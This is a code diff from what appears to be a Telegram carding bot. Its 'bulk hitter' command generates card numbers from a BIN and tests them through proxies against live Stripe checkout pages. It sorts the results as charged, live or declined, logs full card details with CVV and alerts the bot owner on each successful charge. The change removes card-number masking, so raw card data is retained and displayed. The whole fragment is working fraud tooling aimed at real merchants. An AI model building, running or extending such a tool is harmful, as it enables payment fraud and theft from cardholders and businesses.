@@ -12367,10 +12367,7 @@ async def bulkhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     loading_msg = await message.reply_text(
-        f"⚡ <b>BULK HITTER</b>\n{SEP}\n"
-        f"💳 Generated <b>{len(card_lines)}</b> cards from BIN <code>{prefix}</code>\n"
-        f"🔍 Fetching checkout info...",
-        parse_mode=ParseMode.HTML
+        f"{PE_BOLT} <b>Fetching checkout...</b>", parse_mode=ParseMode.HTML
     )
 
     user_proxy = _pick_proxy(user.id)
@@ -12381,14 +12378,13 @@ async def bulkhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         checkout_data = await tls_get_checkout_info(checkout_url, proxy_url)
         if not checkout_data.get("pk") or not checkout_data.get("cs"):
             await loading_msg.edit_text(
-                f"❌ <b>Could not parse checkout URL.</b>\n"
-                f"Make sure the Stripe checkout link is valid and active.",
+                f"{PE_CROSS} <b>Could not parse checkout URL.</b>",
                 parse_mode=ParseMode.HTML
             )
             return
     except Exception as ex:
         await loading_msg.edit_text(
-            f"❌ <b>Error fetching checkout:</b> <code>{str(ex)[:120]}</code>",
+            f"{PE_CROSS} <b>Error fetching checkout:</b> <code>{str(ex)[:120]}</code>",
             parse_mode=ParseMode.HTML
         )
         return
@@ -12397,47 +12393,48 @@ async def bulkhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     sym = get_currency_symbol(checkout_data.get("currency", "USD"))
     price = checkout_data.get("price")
     price_str = f"{sym}{price:.2f}" if price else "N/A"
+    success_url = checkout_data.get("success_url") or "N/A"
+    trial_info = _get_trial_info_text(checkout_data)
     checkout_data["email"] = user_email
+
+    # Build display card list and per-card status tracker
+    display_cards = []
+    for line in card_lines:
+        p = line.split("|")
+        display_cards.append({
+            "cc":    p[0] if p else "",
+            "month": p[1] if len(p) > 1 else "01",
+            "year":  p[2] if len(p) > 2 else "25",
+            "cvv":   p[3] if len(p) > 3 else "000",
+        })
+    card_index = {line: i for i, line in enumerate(card_lines)}
+    card_statuses = [f"{EMOJI['hitting']} Pending..." for _ in display_cards]
 
     charged, live, declined, tds, errors = [], [], [], [], []
     done_count = 0
-    total_count = len(card_lines)
+    total_count = len(display_cards)
     _last_edit = [0.0]
 
-    def _build_running_status():
-        return (
-            f"⚡ <b>BULK HITTER RUNNING</b>\n{SEP}\n"
-            f"🏪 Merchant: <b>{merchant}</b>\n"
-            f"💰 Amount: <b>{price_str}</b>\n"
-            f"💳 BIN: <code>{prefix}</code>\n"
-            f"{SEP}\n"
-            f"✅ {len(charged)}  💚 {len(live)}  🔴 {len(declined)}  "
-            f"🔒 {len(tds)}  ❌ {len(errors)}\n"
-            f"⏳ Progress: <b>{done_count}/{total_count}</b>"
-        )
-
-    await loading_msg.edit_text(
-        f"⚡ <b>BULK HITTER RUNNING</b>\n{SEP}\n"
-        f"🏪 Merchant: <b>{merchant}</b>\n"
-        f"💰 Amount: <b>{price_str}</b>\n"
-        f"💳 BIN: <code>{prefix}</code> → <b>{total_count}</b> cards\n"
-        f"{SEP}\n"
-        f"⏳ Starting — hitting all cards simultaneously...",
-        parse_mode=ParseMode.HTML
+    init_text = await _build_hit_status_text(
+        merchant, price_str, success_url, display_cards, card_statuses, 0,
+        email=user_email, trial_info=trial_info
     )
+    await _safe_edit(loading_msg, init_text, parse_mode=ParseMode.HTML)
 
     async for raw_str, result in bulk_hit_cards(card_lines, checkout_data, user_proxy, user_email):
-        parts = raw_str.split("|")
-        cc    = parts[0] if len(parts) > 0 else ""
-        month = parts[1] if len(parts) > 1 else ""
-        year  = parts[2] if len(parts) > 2 else ""
-        cvv   = parts[3] if len(parts) > 3 else ""
-        masked = f"{cc[:6]}****{cc[-4:]}|{month}|{year}"
+        p = raw_str.split("|")
+        cc    = p[0] if p else ""
+        month = p[1] if len(p) > 1 else ""
+        year  = p[2] if len(p) > 2 else ""
+        cvv   = p[3] if len(p) > 3 else ""
+        idx   = card_index.get(raw_str, -1)
         status = result.get("status", "ERROR")
         resp = html.escape(str(result.get("response", ""))[:60])
 
         if status == "CHARGED":
-            charged.append((masked, resp))
+            if idx >= 0:
+                card_statuses[idx] = f"CHARGED {EMOJI['charged']}"
+            charged.append((raw_str, resp))
             try:
                 log_approved_card(user.id, user.username or user.first_name,
                                   cc, month, year, cvv, "bulk_hitter", resp, {})
@@ -12447,7 +12444,7 @@ async def bulkhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
                 await context.bot.send_message(
                     chat_id=OWNER_ID,
-                    text=(f"⚡ <b>BULK HITTER CHARGED!</b>\n\n"
+                    text=(f"{EMOJI['charged']} <b>BULK HITTER CHARGED!</b>\n\n"
                           f"👤 User: @{user.username or user.id}\n"
                           f"💳 Card: <code>****{cc[-4:]}</code>\n"
                           f"🏪 Merchant: {merchant}\n💰 Amount: {price_str}"),
@@ -12456,55 +12453,48 @@ async def bulkhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             except Exception:
                 pass
         elif status == "LIVE":
-            live.append((masked, resp))
+            if idx >= 0:
+                card_statuses[idx] = f"LIVE {EMOJI['live']} — {resp[:50]}"
+            live.append((raw_str, resp))
         elif status in ("3DS_REQUIRED", "3DS"):
-            tds.append(masked)
+            if idx >= 0:
+                card_statuses[idx] = f"3DS Required {EMOJI['3ds']}"
+            tds.append(raw_str)
         elif status == "DECLINED":
-            declined.append((masked, resp))
+            if idx >= 0:
+                card_statuses[idx] = f"Declined {EMOJI['declined']} — {resp[:50]}"
+            declined.append((raw_str, resp))
         else:
-            errors.append(masked)
+            if idx >= 0:
+                card_statuses[idx] = f"Error {EMOJI['error']} — {resp[:50]}"
+            errors.append(raw_str)
 
         done_count += 1
         now = asyncio.get_event_loop().time()
         if done_count == 1 or done_count == total_count or done_count % 3 == 0 or (now - _last_edit[0] > 2):
             try:
-                await _safe_edit(loading_msg, _build_running_status(), parse_mode=ParseMode.HTML)
+                txt = await _build_hit_status_text(
+                    merchant, price_str, success_url, display_cards, card_statuses,
+                    done_count, email=user_email, trial_info=trial_info
+                )
+                await _safe_edit(loading_msg, txt, parse_mode=ParseMode.HTML)
                 _last_edit[0] = now
             except Exception:
                 pass
 
-    # Final summary
-    lines = [
-        f"⚡ <b>BULK HIT COMPLETE</b>",
-        SEP,
-        f"🏪 Merchant: <b>{merchant}</b>",
-        f"💰 Amount: <b>{price_str}</b>",
-        f"💳 BIN: <code>{prefix}</code> | Cards hit: <b>{total_count}</b>",
-        SEP,
-        f"✅ Charged: <b>{len(charged)}</b>   "
-        f"💚 Live: <b>{len(live)}</b>   "
-        f"🔴 Declined: <b>{len(declined)}</b>   "
-        f"🔒 3DS: <b>{len(tds)}</b>   "
-        f"❌ Errors: <b>{len(errors)}</b>",
-    ]
-
-    if charged:
-        lines.append(SEP)
-        lines.append("✅ <b>CHARGED CARDS:</b>")
-        for c, r in charged[:5]:
-            lines.append(f"<code>{c}</code> — {r}")
-        if len(charged) > 5:
-            lines.append(f"...and {len(charged) - 5} more")
-
-    if live:
-        lines.append(SEP)
-        lines.append("💚 <b>LIVE CARDS:</b>")
-        for c, r in live[:5]:
-            lines.append(f"<code>{c}</code> — {r}")
-        if len(live) > 5:
-            lines.append(f"...and {len(live) - 5} more")
-
-    await loading_msg.edit_text("\n".join(lines), parse_mode=ParseMode.HTML)
+    summary = (
+        f"\n─────────────────────\n"
+        f"{EMOJI['charged']} Charged: {len(charged)}  "
+        f"{EMOJI['live']} Live: {len(live)}  "
+        f"{EMOJI['declined']} Declined: {len(declined)}  "
+        f"{EMOJI['3ds']} 3DS: {len(tds)}  "
+        f"{EMOJI['error']} Errors: {len(errors)}\n"
+    )
+    final_text = await _build_hit_status_text(
+        merchant, price_str, success_url, display_cards, card_statuses,
+        total_count, email=user_email, trial_info=trial_info
+    )
+    await _safe_edit(loading_msg, final_text + summary, parse_mode=ParseMode.HTML)
 
 
 # ============================================================================
